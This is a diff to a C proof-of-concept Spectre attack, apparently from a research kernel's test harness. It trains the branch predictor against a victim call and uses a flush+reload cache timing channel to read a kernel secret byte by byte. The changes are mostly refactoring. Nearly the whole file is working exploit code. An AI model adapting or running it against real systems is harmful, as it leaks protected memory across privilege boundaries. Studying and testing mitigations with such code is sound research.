@@ -31,51 +31,31 @@
 #define CACHE_HIT_THRESHOLD 80
 #define GAP 1024
 
-static inline void clflush(volatile void *p)
-{
+static inline void clflush(volatile void *p) {
   __asm volatile("clflush (%0)" :: "r" (p));
 }
 
-static inline void mfence()
-{
+static inline void mfence() {
   __asm volatile("mfence");
 }
 
-static inline uint64_t
-rdtsc(void)
-{
+static inline uint64_t rdtsc(void) {
   uint32_t hi, lo;
   __asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
   return ((uint64_t)lo)|(((uint64_t)hi)<<32);
 }
 
 // mimic the safe target
-__attribute__((noinline))
-int
-dummy_gadget2(void)
-{
-  return 4;
-}
-
-// mimic the safe target
-__attribute__((noinline))
-int
-dummy_gadget(void)
-{
+__attribute__((noinline)) int dummy_gadget(void) {
   return 3;
 }
 
-
-
 // mimic the victim
-__attribute__((noinline))
-int
-dummy_victim(volatile u8 *channel, volatile u64 dest, volatile int input)
-{
+__attribute__((noinline)) int dummy_victim(volatile u8 *channel, volatile u64 dest, volatile int input) {
   int result;
   __asm volatile("   mov %1, %%r11\n"
                  "   mov $0, %%rdx\n"
-                 "1: cmp $0x64, %%rdx\n"
+                 "1: cmp $0x264, %%rdx\n"
                  "   jle 2f\n"
                  "   jmp 4f\n"
                  "2: jmp 3f\n"
@@ -85,23 +65,9 @@ dummy_victim(volatile u8 *channel, volatile u64 dest, volatile int input)
                  "   movl %%eax, %0\n"
                  : "=r" (result) : "r" (dest): "rdx", "r11");
   return result;
-  // // set up bhb by performing >29 taken branches
-  // int result;
-  // __asm volatile("dummy_victim_start: push %%rdx\n"
-  //                "mov $100, %%rdx\n"
-  //                "1: dec %%rdx\n"
-  //                "jnz 1b\n"
-  //                "pop %%rdx\n"
-  //                "movq %1, %%r11\n"
-  //                "call *%%r11\n"
-  //                "movl %%eax, %0\n"
-  //                : "=r" (result) : "r" (dest) : "r11");
-  // return result;
 }
 
-void*
-mmap_two_pages(u64 addr)
-{
+void* mmap_two_pages(u64 addr) {
   return mmap((void*) (addr & PAGE_INDEX_MASK),
               PAGE_SIZE * 2, // map 2 pages just in case we're close to boundary
               PROT_READ | PROT_WRITE,
@@ -113,9 +79,7 @@ int (*uv)(u8*, u64, int); // memcpy'd dummy_victim
 u64 uga; // address of memcpy'd dummy_gadget
 
 // see appendix C of https://spectreattack.com/spectre.pdf
-int
-readByte(char *addrToRead, char result[2])
-{
+int readByte(char *addrToRead, char result[2]) {
   u8 *channel = (u8*) malloc(256 * GAP * sizeof(u8));
   int hits[256]; // record cache hits
   int tries, i, j, k, mix_i, junk = 0;
@@ -157,27 +121,18 @@ readByte(char *addrToRead, char result[2])
       junk ^= *addr;
       mfence(); // make sure read completes before we check the timer
       elapsed = rdtsc() - start;
-      if (elapsed <= CACHE_HIT_THRESHOLD)
+      if (elapsed <= CACHE_HIT_THRESHOLD) {
         hits[mix_i]++;
+        if (hits[mix_i] > 20) // Stop early if there is a clear signal
+          tries = 0;
+      }
       times[i] = elapsed;
     }
-    for (i = 0; i < 256; i++)
-      if (hits[i] > 20)
-        tries = 0;
   }
-
-  // for (int i = 0; i < 256; i++) {
-  //   printf("%lu ", times[i]);
-  //   if (i%16 == 15) printf("\n");
-  // }
-  // printf("\n");
 
   // locate top two results
   j = k = -1;
   for (i = 0; i < 256; i++) {
-    // if (PRINT_DEBUG && hits[i] > 0)
-    //   printf("hit %d: %d\n", i, hits[i]);
-
     if (j < 0 || hits[i] >= hits[j]) {
       k = j;
       j = i;
@@ -193,15 +148,12 @@ readByte(char *addrToRead, char result[2])
     result[0] = 0;
     result[1] = 0;
   }
-  // printf("\n");
 
   free(channel);
   return junk; // prevent junk from being optimized out
 }
 
-int
-main(int argc, char *argv[])
-{
+int main(int argc, char *argv[]) {
   extern char dummy_victim_branch_addr[];
 
   u64 kva = ward_spectre_get_victim_branch_addr(); // need to mistrain this call
@@ -239,11 +191,9 @@ main(int argc, char *argv[])
   u64 secret_addr = ward_spectre_get_secret_addr(&secret_len);
 
   int junk = 0;
-  char result[2]; // result[0] is the char, result[1] == 1 if char is valid
-  int index = 0;
-
   printf("Reading secret phrase: "); fflush(stdout);
-  while (index < secret_len) {
+  for (int index = 0; index < secret_len; index++) {
+    char result[2]; // result[0] is the char, result[1] == 1 if char is valid
     junk += readByte(((char*) secret_addr) + index, result);
     if (result[1] == 1) {
       printf("%c", result[0]);
@@ -251,7 +201,6 @@ main(int argc, char *argv[])
       printf("?");
     }
     fflush(stdout);
-    index++;
   }
 
   printf("\n");
